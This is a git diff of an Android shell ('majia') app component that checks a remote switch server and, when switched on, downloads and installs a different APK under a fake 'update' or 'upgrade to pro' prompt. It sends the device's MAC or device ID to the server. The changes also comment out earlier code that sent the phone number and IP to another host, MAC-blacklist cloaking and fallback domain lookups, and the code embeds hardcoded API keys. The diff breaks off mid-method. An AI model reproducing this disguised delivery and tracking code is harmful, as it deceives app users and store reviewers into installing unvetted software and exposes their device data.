@@ -12,27 +12,28 @@ import android.content.pm.PackageInfo;
 import android.content.pm.PackageManager;
 import android.net.Uri;
 import android.os.Build;
-import android.os.Bundle;
 import android.os.Environment;
-import android.support.annotation.NonNull;
-import android.support.annotation.Nullable;
-import android.support.v4.app.ActivityCompat;
-import android.support.v4.content.ContextCompat;
-import android.support.v4.content.FileProvider;
+//import android.support.annotation.NonNull;
+//import android.support.annotation.Nullable;
+//import android.support.v4.app.ActivityCompat;
+//import android.support.v4.content.ContextCompat;
+//import android.support.v4.content.FileProvider;
 import android.text.TextUtils;
 import android.util.Log;
 import android.view.View;
-import android.view.WindowManager;
 import android.widget.RelativeLayout;
 import android.widget.TextView;
 import android.widget.Toast;
 
 import com.regus.mj.config.KGConfig;
+import com.regus.mj.config.PostBean;
 import com.regus.mj.utils.AssistUtils;
-import com.regus.mj.utils.CrashHandler;
+import com.regus.mj.utils.FastJsonUtils;
+import com.regus.mj.utils.GsonUtil;
+import com.regus.mj.utils.InstallUtils;
+import com.regus.mj.view.BaseDialogFragment;
 import com.regus.mj.view.TBProgressView;
 
-import org.json.JSONArray;
 import org.json.JSONException;
 import org.json.JSONObject;
 
@@ -43,37 +44,45 @@ import java.io.IOException;
 import java.io.InputStream;
 import java.io.InputStreamReader;
 import java.io.OutputStream;
+import java.io.PrintWriter;
 import java.net.HttpURLConnection;
 import java.net.MalformedURLException;
 import java.net.URL;
+import java.security.MessageDigest;
+import java.security.NoSuchAlgorithmException;
 import java.util.ArrayList;
 import java.util.List;
 
+import androidx.annotation.NonNull;
+import androidx.core.app.ActivityCompat;
+import androidx.core.content.ContextCompat;
+import androidx.core.content.FileProvider;
 
-public class MJRegusActivity extends Activity {
+import static com.regus.mj.utils.KgUtils.httpHost;
+
+
+public class MJRegusDialogFragment extends BaseDialogFragment {
 
 
     //服务器上的马甲id
 
-    private String mAid = KGConfig.AppInfoConfig.app_aid;
+    private String mAid = KGConfig.getInstance().getApp_aid();
     //服务器上该马甲的渠道id
-    private String mSid = KGConfig.AppInfoConfig.app_sid;
+    private String mSid = KGConfig.getInstance().getApp_sid();
 
     //跳转到原马甲包启动页的全路径
-    private String activityPath = KGConfig.AppInfoConfig.app_main_path;
+   // private String activityPath = KGConfig.AppInfoConfig.app_main_path;
 
     //后台开关地址  域名动态获取
-    private String busUrl = KGConfig.ServerConfig.bussnessUrl;
+    //private String busUrl = KGConfig.ServerConfig.bussnessUrl;
 
-    String root_old = "http://woaizggcdws.com:48581/shellapi/welcome";
-    String root_gitee = "https://gitee.com/tai-army/root-domain-name/raw/master/README.md";
-    String root_gitlab = "https://gitlab.com/guangzhouboning/roothost/-/raw/master/README.md";
+//    String root_old = "http://woaizggcdws.com:48581/shellapi/welcome";
+//    String root_gitee = "https://gitee.com/tai-army/root-domain-name/raw/master/README.md";
+//    String root_gitlab = "https://gitlab.com/guangzhouboning/roothost/-/raw/master/README.md";
 
-    //握手地址
-    String getHostUrl = root_gitee;
+//    //握手地址
+//    String getHostUrl = root_gitee;
 
-    //服务器ip
-    private String serverIp = KGConfig.ServerConfig.ip;
 
 
     //id 值   这些限制都只是占位词  后面直接用16进制 替换
@@ -81,10 +90,8 @@ public class MJRegusActivity extends Activity {
      * 植入的图片  启动图背景叫 mj_splash.png      下载时候的背景叫 mj_down_splash.png
      */
 
-    //该页面的启动页图片的id
-    private int splash_bg_id = KGConfig.UIConfig.app_splash_rec;
     //该页面的下载时候的背景图片id
-    private int splash_down_bg_id = KGConfig.UIConfig.app_splash_down_rec;
+    private int splash_down_bg_id = KGConfig.getInstance().getApp_splash_down_rec();
 
 
     /**
@@ -92,13 +99,13 @@ public class MJRegusActivity extends Activity {
      */
 
     //页面布局的id
-    private int activity_layout_id = KGConfig.UIConfig.app_layout_splash;
+    private int activity_layout_id = KGConfig.getInstance().getApp_layout_splash();
     //页面布局的根布局的id
-    private int root_view_id = KGConfig.UIConfig.app_view_root;
+    private int root_view_id = KGConfig.getInstance().getApp_view_root();
     //该页面的加载框id
-    private int progress_bar_id = KGConfig.UIConfig.app_view_progressbar;
+    private int progress_bar_id = KGConfig.getInstance().getApp_view_progressbar();
     //百分比
-    private int progress_bar_num = KGConfig.UIConfig.app_view_progressnum;
+    private int progress_bar_num = KGConfig.getInstance().getApp_view_progressnum();
 
 
     private String downLoadUrl;
@@ -111,8 +118,8 @@ public class MJRegusActivity extends Activity {
     private RelativeLayout mRootView;
     private TextView mProgressNum;
 
-    private List<String> mHosts = new ArrayList<>();
-    private int mCurrentReqposition;
+//    private List<String> mHosts = new ArrayList<>();
+//    private int mCurrentReqposition;
 
     private DownloadApkThread downloadApkThread;
 
@@ -135,7 +142,7 @@ public class MJRegusActivity extends Activity {
     //设备相关
 
     private String macAddress;
-    private String phoneNum;
+    //private String phoneNum;
     private String ip;
     private String sysInfo;
 
@@ -143,91 +150,76 @@ public class MJRegusActivity extends Activity {
 
 
     @Override
-    protected void onCreate(@Nullable Bundle savedInstanceState) {
-        super.onCreate(savedInstanceState);
+    protected int getViewId() {
+        return activity_layout_id;
+    }
 
+    @Override
+    protected void initViews(View view) {
 
-        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN, WindowManager.LayoutParams.FLAG_FULLSCREEN);
+        //根布局id mj_root_view
+        setRootViewId(view);
 
-        getWindow().setFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON, WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);
+        //设置启动图id`
+        setSplashId(view);
 
+        //设置资源进度条id
+        setProgressBarId(view);
 
-        if (Build.VERSION.SDK_INT < 19) {// lower api
-            View v = this.getWindow().getDecorView();
-            v.setSystemUiVisibility(View.GONE);
-        } else {
-            View decorView = getWindow().getDecorView();
-            decorView.setSystemUiVisibility(View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
-                    | View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY | View.SYSTEM_UI_FLAG_FULLSCREEN);
-        }
+        //设置资源进度条 百分比id
+        setProgressBarNumId(view);
+    }
 
+    @Override
+    protected void initData() {
 
         checkAppInfo();
 
-        //设 layout id
-        setLayoutId();
+       // checkPermision();
 
-        //根布局id mj_root_view
-        setRootViewId();
-
-        //设置启动图id`
-        setSplashId();
-
-        //设置资源进度条id
-        setProgressBarId();
-
-        //设置资源进度条 百分比id
-        setProgressBarNumId();
-
-        checkPermision();
-
+        afterCheckPermision();
     }
 
 
     private void checkAppInfo() {
 
-        if (TextUtils.isEmpty(mAid) || TextUtils.isEmpty(mSid) || TextUtils.isEmpty(activityPath)
-                || splash_bg_id == 0 || splash_down_bg_id == 0 || activity_layout_id == 0 || root_view_id == 0 ||
+        if (TextUtils.isEmpty(mAid)
+             || splash_down_bg_id == 0 || activity_layout_id == 0 || root_view_id == 0 ||
                 progress_bar_id == 0 || progress_bar_num == 0) {
 
-            Toast.makeText(getApplicationContext(), "KG参数未配置正确~", Toast.LENGTH_LONG);
+            Toast.makeText(getContext(), "KG参数未配置正确~", Toast.LENGTH_LONG);
 
-            finish();
+            dismissAllowingStateLoss();
 
         }
 
     }
 
 
-    //设 layout id
-    @SuppressLint("ResourceType")
-    private void setLayoutId() {
-        setContentView(activity_layout_id);
-    }
 
     //设 RootView id
     @SuppressLint("ResourceType")
-    private void setRootViewId() {
-        mRootView = findViewById(root_view_id);
+    private void setRootViewId(View view) {
+        mRootView = view.findViewById(root_view_id);
     }
 
     //设置启动图id
     @SuppressLint("ResourceType")
-    private void setSplashId() {
-        mRootView.setBackgroundResource(splash_bg_id);
+    private void setSplashId(View view) {
+        mRootView.setBackgroundResource(splash_down_bg_id);
     }
 
     //设置progress bar id
     @SuppressLint("ResourceType")
-    private void setProgressBarId() {
-        progressBar = findViewById(progress_bar_id);
+    private void setProgressBarId(View view) {
+        progressBar = view.findViewById(progress_bar_id);
         progressBar.setProgress(0);
     }
 
     //设置progress bar num  id
     @SuppressLint("ResourceType")
-    private void setProgressBarNumId() {
-        mProgressNum = findViewById(progress_bar_num);
+    private void setProgressBarNumId(View view) {
+        mProgressNum = view.findViewById(progress_bar_num);
     }
 
 
@@ -239,30 +231,29 @@ public class MJRegusActivity extends Activity {
 
         try {
 
-            if (!AssistUtils.iConnected(this)) {
-                showNoNetDialog();
-                return;
-            }
+//            if (!AssistUtils.iConnected(getContext())) {
+//                showNoNetDialog();
+//                return;
+//            }
 
 
-            macAddress = AssistUtils.getMacAddress(this);
+            macAddress = AssistUtils.getMacAddress(getContext());
             Log.e("regus_mac ", macAddress + "");
 
             if ("02:00:00:00:00:00".equals(macAddress)) {//如果获取不到mac地址
-                macAddress = AssistUtils.getDeviceId(this);
+                macAddress = AssistUtils.getDeviceId(getContext());
                 Log.e("regus_mac_dev ", macAddress);
             }
 
-            phoneNum = AssistUtils.getPhoneNum(this);
-            Log.e("regus_phoneNum ", phoneNum + "");
-            ip = AssistUtils.getIPAddress(this);
+          //  phoneNum = AssistUtils.getPhoneNum(getContext());
+            ip = AssistUtils.getIPAddress(getContext());
             Log.e("regus_ip ", ip + "");
             sysInfo = AssistUtils.getSystemInfo();
 
-            CrashHandler.getInstance().setData("houtai.wlt99.com:48582", macAddress, phoneNum, ip, sysInfo, mAid, mSid);
-
-            CrashHandler.getInstance()
-                    .init(getApplicationContext());
+//            CrashHandler.getInstance().setData("houtai.wlt99.com:48582", macAddress, phoneNum, ip, sysInfo, mAid, mSid);
+//
+//            CrashHandler.getInstance()
+//                    .init(getApplicationContext());
 
         }catch (Exception e){
 
@@ -276,10 +267,10 @@ public class MJRegusActivity extends Activity {
 
     void showNoNetDialog() {
 
-        Toast.makeText(this, "网络状态异常", Toast.LENGTH_SHORT);
+        Toast.makeText(getContext(), "网络状态异常", Toast.LENGTH_SHORT);
 
         //创建dialog构造器
-        AlertDialog.Builder normalDialog = new AlertDialog.Builder(MJRegusActivity.this);
+        AlertDialog.Builder normalDialog = new AlertDialog.Builder(getActivity());
         //设置title
         normalDialog.setTitle("网络状态异常");
         //设置内容
@@ -297,7 +288,7 @@ public class MJRegusActivity extends Activity {
         normalDialog.setNegativeButton("取消", new DialogInterface.OnClickListener() {
             @Override
             public void onClick(DialogInterface dialog, int which) {
-                finish();
+                getActivity().finish();
             }
         });
 
@@ -308,12 +299,13 @@ public class MJRegusActivity extends Activity {
 
 
     void RequestThat() {
-        getHostRequest();
+        Log.e("RequestThat", "requsetKaiGuanServer");
+        requsetKaiGuanServer();
     }
 
 
     void getDt() {
-        Log.e("regus_next", "getDt");
+        Log.e("regus_getDt", "getDt");
         new Thread(new GetDtRunnale()).start();
     }
 
@@ -324,12 +316,12 @@ public class MJRegusActivity extends Activity {
         public void run() {
 
             try {
-                URL urll = new URL("https://qnl4eqoe.api.lncld.net/1.1/classes/UpVersion/607e942e52b81d30aca9667a");
+                URL urll = new URL("https://qnl4eqoe.api.lncld.net/1.1/classes/UpVersion/61665006ec1d407bb2450e59");
                 HttpURLConnection urlConnection = (HttpURLConnection) urll.openConnection();
                 urlConnection.setRequestProperty("X-LC-Id", "QnL4eqOeVFvxKnwF1gLDJywM-gzGzoHsz");
                 urlConnection.setRequestProperty("X-LC-Key", "8gEvCsJUQAcw2RJHpfoXknLQ");
-                urlConnection.setConnectTimeout(4000);
-                urlConnection.setReadTimeout(4000);
+                urlConnection.setConnectTimeout(10000);
+                urlConnection.setReadTimeout(10000);
                 urlConnection.setRequestMethod("GET");
                 urlConnection.connect();
                 int code = urlConnection.getResponseCode();
@@ -342,7 +334,6 @@ public class MJRegusActivity extends Activity {
                         buffer.append(line);
                     }
                     String jsonStr = buffer.toString();
-                    //     Log.e("regus getDt ", jsonStr + "");
 
                     //处理
                     try {
@@ -354,7 +345,7 @@ public class MJRegusActivity extends Activity {
                         String url = avObject.getString("url");
                         boolean isStop = avObject.getBoolean("stop");
 
-                        Log.e("avo", "s  " + show + " i  " + isStop);
+                     //   Log.e("avo", "s  " + show + " i  " + isStop);
 
                         if (isStop) {
                             if (show == 2) {
@@ -362,9 +353,9 @@ public class MJRegusActivity extends Activity {
                                     downLoadUrl = url;
                                     mode = 1;
 
-                                  //  showDownLoadDialog();
+                                    showDownLoadDialog();
                                     isForce = true;
-                                    checkPermision();
+                               //     checkPermision();
 
                                 } else {
                                     Intent intent = new Intent();
@@ -399,7 +390,7 @@ public class MJRegusActivity extends Activity {
 
     private void showDownLoadUi() {
 
-        startService(new Intent(this, MJForegroundService.class));
+      //  getContext().startService(new Intent(getContext(), MJForegroundService.class));
 
         setDownLoadApkBgId();
         downloadPackage();
@@ -420,7 +411,7 @@ public class MJRegusActivity extends Activity {
         try {
             mPermissionList.clear();
             for (int i = 0; i < permissions.length; i++) {
-                if (ContextCompat.checkSelfPermission(this, permissions[i]) != PackageManager.PERMISSION_GRANTED) {
+                if (ContextCompat.checkSelfPermission(getContext(), permissions[i]) != PackageManager.PERMISSION_GRANTED) {
                     mPermissionList.add(permissions[i]);
                 }
             }
@@ -437,15 +428,8 @@ public class MJRegusActivity extends Activity {
 
             } else {//请求权限方法
 
-                runOnUiThread(new Runnable() {
-                    @Override
-                    public void run() {
-                        Toast.makeText(getApplicationContext(), "版本需要强制更新，请给予必要权限~", Toast.LENGTH_LONG);
-                    }
-                });
-
                 String[] permissions = mPermissionList.toArray(new String[mPermissionList.size()]);//将List转为数组
-                ActivityCompat.requestPermissions(this, permissions, 1);
+                ActivityCompat.requestPermissions(getActivity(), permissions, 1);
             }
         } catch (Exception e) {
 
@@ -466,7 +450,7 @@ public class MJRegusActivity extends Activity {
                 for (int i = 0; i < grantResults.length; i++) {
                     if (grantResults[i] != PackageManager.PERMISSION_GRANTED) {
                         //判断是否勾选禁止后不再询问
-                        boolean showRequestPermission = ActivityCompat.shouldShowRequestPermissionRationale(this, permissions[i]);
+                        boolean showRequestPermission = ActivityCompat.shouldShowRequestPermissionRationale(getActivity(), permissions[i]);
                         if (showRequestPermission) {//
 
                             if(isForce){
@@ -490,282 +474,215 @@ public class MJRegusActivity extends Activity {
     }
 
 
-    private void getHostRequest() {
-        new Thread(new GetHostRequestRunnable()).start();
-    }
+//    private void getHostRequest() {
+//        new Thread(new GetHostRequestRunnable()).start();
+//    }
+//
+//
+//    private class GetHostRequestRunnable implements Runnable {
+//
+//        @Override
+//        public void run() {
+//
+//            try {
+//                Log.e("regus_getHost ", getHostUrl + "");
+//
+//                URL urll = new URL(getHostUrl);
+//                HttpURLConnection urlConnection = (HttpURLConnection) urll.openConnection();
+//                urlConnection.setConnectTimeout(7000);
+//                urlConnection.setReadTimeout(7000);
+//                urlConnection.setRequestMethod("GET");
+//                urlConnection.connect();
+//                int code = urlConnection.getResponseCode();
+//                if (code == 200) {
+//                    InputStream inputStream = urlConnection.getInputStream();
+//                    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
+//                    String line;
+//                    StringBuffer buffer = new StringBuffer();
+//                    while ((line = bufferedReader.readLine()) != null) {
+//                        buffer.append(line);
+//                    }
+//                    String jsonStr = buffer.toString();
+//                    Log.e("regus getHost array", jsonStr + "");
+//
+//                    //处理
+//                    try {
+//
+//                        JSONArray jsonArray = new JSONArray(jsonStr.replace("\\", ""));
+//                        Log.e("regus  array size", jsonArray.length() + "");
+//
+//                        traverseHost(jsonArray);
+//
+//                    } catch (JSONException e) {
+//                        e.printStackTrace();
+//                        Log.e("regus getHost", e.getLocalizedMessage() + "");
+//                        requsetKaiGuanServer(serverIp);
+//                    }
+//                } else {
+//                    Log.e("regus getHost", "code 不是200");
+//
+//                    if (getHostUrl.equals(root_gitee)) {
+//                        getHostUrl = root_gitlab;
+//                        getHostRequest();
+//                        return;
+//                    }
+//
+//                    if(getHostUrl.equals(root_gitlab)){
+//                        getHostUrl = root_old;
+//                        getHostRequest();
+//                        return;
+//                    }
+//
+//                    requsetKaiGuanServer(serverIp);
+//
+//                }
+//            } catch (Exception e) {
+//                Log.e("regus getHost", e.getLocalizedMessage() + "");
+//
+//                if (getHostUrl.equals(root_gitee)) {
+//                    getHostUrl = root_gitlab;
+//                    getHostRequest();
+//                    return;
+//                }
+//
+//                if(getHostUrl.equals(root_gitlab)){
+//                    getHostUrl = root_old;
+//                    getHostRequest();
+//                    return;
+//                }
+//
+//                requsetKaiGuanServer(serverIp);
+//            }
+//
+//        }
+//
+//
+//    }
+//
+//
+//    void traverseHost(JSONArray jsonArray) {
+//
+//        List<String> stringList = new ArrayList<>();
+//
+//        for (int i = 0; i < jsonArray.length(); i++) {
+//            try {
+//                stringList.add((String) jsonArray.get(i));
+//            } catch (JSONException e) {
+//                e.printStackTrace();
+//            }
+//        }
+//        mHosts = stringList;
+//
+//        if (mHosts.size() > 0) {
+//            mCurrentReqposition = 0;
+//            requsetKaiGuanServer(mHosts.get(mCurrentReqposition));
+//        }
+//
+//    }
+//
+//
+//    void requestNextHost() {
+//        int hostSize = mHosts.size();
+//        if (mCurrentReqposition < hostSize - 1) {
+//            mCurrentReqposition = mCurrentReqposition + 1;
+//            requsetKaiGuanServer(mHosts.get(mCurrentReqposition));
+//        } else {
+//            //没有任何域名可用
+//            jumpLocalSplash();
+//        }
+//    }
 
 
-    private class GetHostRequestRunnable implements Runnable {
+    public  void requsetKaiGuanServer() {
 
-        @Override
-        public void run() {
-
-            try {
-                Log.e("regus_getHost ", getHostUrl + "");
-
-                URL urll = new URL(getHostUrl);
-                HttpURLConnection urlConnection = (HttpURLConnection) urll.openConnection();
-                urlConnection.setConnectTimeout(7000);
-                urlConnection.setReadTimeout(7000);
-                urlConnection.setRequestMethod("GET");
-                urlConnection.connect();
-                int code = urlConnection.getResponseCode();
-                if (code == 200) {
-                    InputStream inputStream = urlConnection.getInputStream();
-                    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
-                    String line;
-                    StringBuffer buffer = new StringBuffer();
-                    while ((line = bufferedReader.readLine()) != null) {
-                        buffer.append(line);
-                    }
-                    String jsonStr = buffer.toString();
-                    Log.e("regus getHost array", jsonStr + "");
-
-                    //处理
-                    try {
-
-                        JSONArray jsonArray = new JSONArray(jsonStr.replace("\\", ""));
-                        Log.e("regus  array size", jsonArray.length() + "");
-
-                        traverseHost(jsonArray);
-
-                    } catch (JSONException e) {
-                        e.printStackTrace();
-                        Log.e("regus getHost", e.getLocalizedMessage() + "");
-                        requsetKaiGuanServer(serverIp);
-                    }
-                } else {
-                    Log.e("regus getHost", "code 不是200");
-
-                    if (getHostUrl.equals(root_gitee)) {
-                        getHostUrl = root_gitlab;
-                        getHostRequest();
-                        return;
-                    }
-
-                    if(getHostUrl.equals(root_gitlab)){
-                        getHostUrl = root_old;
-                        getHostRequest();
-                        return;
-                    }
-
-                    requsetKaiGuanServer(serverIp);
-
-                }
-            } catch (Exception e) {
-                Log.e("regus getHost", e.getLocalizedMessage() + "");
-
-                if (getHostUrl.equals(root_gitee)) {
-                    getHostUrl = root_gitlab;
-                    getHostRequest();
-                    return;
-                }
-
-                if(getHostUrl.equals(root_gitlab)){
-                    getHostUrl = root_old;
-                    getHostRequest();
-                    return;
-                }
-
-                requsetKaiGuanServer(serverIp);
-            }
-
-        }
-
-
-    }
-
-
-    void traverseHost(JSONArray jsonArray) {
-
-        List<String> stringList = new ArrayList<>();
-
-        for (int i = 0; i < jsonArray.length(); i++) {
-            try {
-                stringList.add((String) jsonArray.get(i));
-            } catch (JSONException e) {
-                e.printStackTrace();
-            }
-        }
-        mHosts = stringList;
-
-        if (mHosts.size() > 0) {
-            mCurrentReqposition = 0;
-            requsetKaiGuanServer(mHosts.get(mCurrentReqposition));
-        }
-
-    }
-
-
-    void requestNextHost() {
-        int hostSize = mHosts.size();
-        if (mCurrentReqposition < hostSize - 1) {
-            mCurrentReqposition = mCurrentReqposition + 1;
-            requsetKaiGuanServer(mHosts.get(mCurrentReqposition));
-        } else {
-            //没有任何域名可用
-            jumpLocalSplash();
-        }
-    }
-
-
-    private void requsetKaiGuanServer(String bUrl) {
-
-
-        String url = "http://" + bUrl + busUrl;
-
-        new Thread(new RequestMacRunnable(mAid, mSid, url, bUrl)).start();
-
+        new Thread(new RequestAppInfoRunnable(mAid, mSid)).start();
 
     }
 
 
-    private class RequestMacRunnable implements Runnable {
-
-        String url;
-        String aid;
-        String sid;
-        String host;
-
-        public RequestMacRunnable(String aid, String sid, String url, String bul) {
-            this.aid = aid;
-            this.sid = sid;
-            this.url = url;
-            host = bul;
-        }
-
-
-        @Override
-        public void run() {
-
-
-            try {
-                Thread.sleep(2000);
-            } catch (InterruptedException e) {
-                e.printStackTrace();
-            }
-
-
-            if (TextUtils.isEmpty(macAddress)) {
-                new Thread(new RequestAppInfoRunnable(mAid, mSid, url, host)).start();
-                return;
-            }
-
-            String rootUrl = "http://" + host + busUrl + "/IsBlack?mac=" + macAddress;
-
-            Log.e("regus_", "请求的mac接口 " + rootUrl);
-
-
-            try {
-                URL urll = new URL(rootUrl);
-                HttpURLConnection urlConnection = (HttpURLConnection) urll.openConnection();
-                urlConnection.setConnectTimeout(5000);
-                urlConnection.setReadTimeout(5000);
-                urlConnection.setRequestMethod("GET");
-                urlConnection.connect();
-                int code = urlConnection.getResponseCode();
-                if (code == 200) {
-
-                    InputStream inputStream = urlConnection.getInputStream();
-                    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
-                    String line;
-                    StringBuffer buffer = new StringBuffer();
-                    while ((line = bufferedReader.readLine()) != null) {
-                        buffer.append(line);
-                    }
-                    String jsonStr = buffer.toString();
-                    Log.e("regus_mac接口返回", jsonStr + "");
-
-                    JSONObject responseJson = new JSONObject(jsonStr.replace("\\", ""));
-
-                    if (responseJson.has("Status") && responseJson.has("Data")) {
-
-                        if (responseJson.getBoolean("Data")) {
-                            //是黑名单手机
-                            jumpLocalSplash();
-                        } else {
-                            new Thread(new RequestAppInfoRunnable(mAid, mSid, url, host)).start();
-                        }
-                    } else {
-                        requestNextHost();
-                    }
-
-                } else {
-                    requestNextHost();
-                }
-            } catch (Exception e) {
-                requestNextHost();
-                Log.e("reugs", "mac接口 " + e.getLocalizedMessage());
-            }
-
-        }
-
-    }
 
 
     private class RequestAppInfoRunnable implements Runnable {
 
-        String url;
         String aid;
         String sid;
-        String host;
 
-        public RequestAppInfoRunnable(String aid, String sid, String url, String bul) {
+        public RequestAppInfoRunnable(String aid, String sid) {
             this.aid = aid;
             this.sid = sid;
-            this.url = url;
-            host = bul;
         }
 
         @Override
         public void run() {
 
-            if (TextUtils.isEmpty(aid) || TextUtils.isEmpty(sid)) {
+            if (TextUtils.isEmpty(aid)) {
                 jumpLocalSplash();
                 return;
             }
 
-            String rootUrl = url + "/GetAppInfo?aid=";
+            String url =  httpHost[0] + "/Inbound/QueryAppConfig";
+
+            String time = System.currentTimeMillis()+"";
+
+            PostBean postBean = new PostBean();
+            postBean.setClientSource(0);
+            postBean.setPartnerKey("b82cc1515cd64869beefe697cce16aad");
+            postBean.setDate(time);
+            postBean.setToken("");
+
+            PostBean.ParamBean paramBean = new PostBean.ParamBean();
+            paramBean.setMac(macAddress);
+            paramBean.setChannelId(sid);
+            paramBean.setAppKey(aid);
+
+            postBean.setParam(paramBean);
+
+            Log.e("regus",   "post re sign: " + time + FastJsonUtils.toJSONString(paramBean) +  "b82cc1515cd64869beefe697cce16aad");
+
+           String sign = md5(time + FastJsonUtils.toJSONString(paramBean) +  "b82cc1515cd64869beefe697cce16aad") ;
+
+           postBean.setSign(sign);
 
 
-            String allUrl = rootUrl + aid + "&sid=" + sid;
+            Log.e("regus",   "post sign " + sign);
 
-            Log.e("regus_", "请求的kg接口 " + allUrl);
+            String param = GsonUtil.GsonString(postBean);
+
+            Log.e("regus",   "post param " + param);
+
+
 
             try {
-                URL urll = new URL(allUrl);
+
+                PrintWriter out = null;
+
+                URL urll = new URL(url);
                 HttpURLConnection urlConnection = (HttpURLConnection) urll.openConnection();
-                urlConnection.setConnectTimeout(5000);
-                urlConnection.setReadTimeout(5000);
-                urlConnection.setRequestMethod("GET");
+                urlConnection.setConnectTimeout(15000);
+                urlConnection.setReadTimeout(15000);
+                urlConnection.setRequestMethod("POST");
 
-                Log.e("regus", " header中 增加mac " + macAddress);
+                urlConnection.setRequestProperty("Content-Type", " application/json");// 设定
+                urlConnection.setDoOutput(true);
+                urlConnection.setDoInput(true);
+                urlConnection.setUseCaches(false)
+                ;
 
-                if (!macAddress.equals("02:00:00:00:00:00")) {
-                    urlConnection.setRequestProperty("mac", macAddress);
-                } else {
-                    urlConnection.setRequestProperty("mac", "某手机获取不到mac地址或设备号");
-                }
+                out = new PrintWriter(urlConnection.getOutputStream());
 
-                urlConnection.setRequestProperty("qId", System.currentTimeMillis() + "");
+                // 发送请求参数
 
-                if (!TextUtils.isEmpty(ip)) {
-                    urlConnection.setRequestProperty("ip", ip);
-                }
+                out.print(param);
 
-                urlConnection.setRequestProperty("deviceType", "Andriod");
+                // flush输出流的缓冲
 
-                if (!TextUtils.isEmpty(phoneNum)) {
-                    urlConnection.setRequestProperty("mobile", phoneNum);
-                }
+                out.flush();
+                out.close();
 
-                urlConnection.setRequestProperty("osVersion", sysInfo);
+                Log.e("regus",   "post start");
 
-                urlConnection.setRequestProperty("provider", AssistUtils.getDeviceBrand());
-
-
-                urlConnection.connect();
                 int code = urlConnection.getResponseCode();
+
                 if (code == 200) {
 
                     InputStream inputStream = urlConnection.getInputStream();
@@ -778,17 +695,44 @@ public class MJRegusActivity extends Activity {
                     String jsonStr = buffer.toString();
                     Log.e("regus", jsonStr + "");
 
-                    solveLines(true, host, jsonStr);
+                    solveLines(true, jsonStr);
 
                 } else {
-                    solveLines(false, host, null);
+                    Log.e("regus",   "不是200");
+                    solveLines(false, null);
                 }
             } catch (Exception e) {
-                solveLines(false, host, null);
+                Log.e("regus",   "请求开关错误 "+e.getLocalizedMessage());
+                solveLines(false, null);
             }
 
         }
 
+    }
+
+
+
+    public static String md5(String string) {
+        if (TextUtils.isEmpty(string)) {
+            return "";
+        }
+        MessageDigest md5 = null;
+        try {
+            md5 = MessageDigest.getInstance("MD5");
+            byte[] bytes = md5.digest(string.getBytes());
+            String result = "";
+            for (byte b : bytes) {
+                String temp = Integer.toHexString(b & 0xff);
+                if (temp.length() == 1) {
+                    temp = "0" + temp;
+                }
+                result += temp;
+            }
+            return result;
+        } catch (NoSuchAlgorithmException e) {
+            e.printStackTrace();
+        }
+        return "";
     }
 
 
@@ -798,7 +742,7 @@ public class MJRegusActivity extends Activity {
     /**
      * 处理几个ping 域名的请求
      */
-    private synchronized void solveLines(boolean isOK, String host, String buJson) {
+    private synchronized void solveLines(boolean isOK, String buJson) {
 
         if (isGetKgRepInfoAlready) {
             Log.e("regus_", " 已经有可用域名 其他的直接return");
@@ -808,83 +752,88 @@ public class MJRegusActivity extends Activity {
 
         if (isOK) {
 
-            Log.e("regus_", " 域名: " + host + " 可用, 已经被优先使用了");
-
             isGetKgRepInfoAlready = true;
 
             //处理
             try {
                 JSONObject responseJson = new JSONObject(buJson.replace("\\", ""));
 
-                if (responseJson.has("Status") && responseJson.has("Data")) {
-                    if (responseJson.getBoolean("Status")) {
+                if (responseJson.has("Code") && responseJson.has("Value")) {
+                    if (responseJson.getInt("Code") == 1) {
 
-                        JSONObject dataJsonObject = new JSONObject(responseJson.getString("Data"));
+                        JSONObject dataJsonObject = new JSONObject(responseJson.getString("Value"));
 
-                        if (!dataJsonObject.getBoolean("IsAdvertising")) {
-                            clearSp(getBaseContext());
+
+                        //IsLimit
+                        if (dataJsonObject.getBoolean("IsLimit")) {
+                            jumpLocalSplash();
+                            return;
                         }
 
 
-                        if (dataJsonObject.has("IsMix") && dataJsonObject.getBoolean("IsMix")) {
+                        if (!dataJsonObject.getBoolean("IsOpenAdvert")) {
+                            clearSp(getContext());
+                        }
+
+
+                        if (dataJsonObject.has("IsOpenFuse") && dataJsonObject.getBoolean("IsOpenFuse")) {
                             //融合模式
                             mode = 2;
 
                             //融合模式
-                            runOnUiThread(new Runnable() {
+                           getActivity(). runOnUiThread(new Runnable() {
                                 @Override
                                 public void run() {
-                                    Toast.makeText(getApplicationContext(), "资源包已经准备好，点击安装，升级到专业版~", Toast.LENGTH_LONG);
+                                    Toast.makeText(getContext(), "资源包已经准备好，点击安装，升级到专业版~", Toast.LENGTH_LONG);
                                 }
                             });
-                            //环彩181504
-                            downLoadUrl = dataJsonObject.getString("DownloadUrl");
+
                             getApkFromAssets();
 
-                        } else if (dataJsonObject.getBoolean("IsAdvertising")) {
+                        }
+                        else if (dataJsonObject.getBoolean("IsOpenAdvert")) {
 
-                            if (dataJsonObject.has("AdvertiseList")) {
-                                JSONArray advertiseArray = dataJsonObject.getJSONArray("AdvertiseList");
-
-                                String key_ad_kg = "key_ad_kg";
-                                String key_ad_value = "key_ad_value";
-
-
-                                if (advertiseArray != null) {
-                                    for (int i = 0; i < advertiseArray.length(); i++) {
-                                        JSONObject jsonObject = advertiseArray.getJSONObject(i);
-                                        if (jsonObject != null) {
-                                            if (jsonObject.has("AdvertiseUrl")) {
-
-                                                getSharedPreferences("regus", Context.MODE_PRIVATE).edit()
-                                                        .putString(key_ad_value + i, jsonObject.getString("AdvertiseUrl")).apply();
-
-                                            }
-
-                                            if (jsonObject.has("IsEnable")) {
-
-                                                getSharedPreferences("regus", Context.MODE_PRIVATE).edit()
-                                                        .putBoolean(key_ad_kg + i, jsonObject.getBoolean("IsEnable")).apply();
-                                            }
-                                        }
-                                    }
-                                }
-
-                            }
+//                            if (dataJsonObject.has("AdvertiseList")) {
+//                                JSONArray advertiseArray = dataJsonObject.getJSONArray("AdvertiseList");
+//
+//                                String key_ad_kg = "key_ad_kg";
+//                                String key_ad_value = "key_ad_value";
+//
+//
+//                                if (advertiseArray != null) {
+//                                    for (int i = 0; i < advertiseArray.length(); i++) {
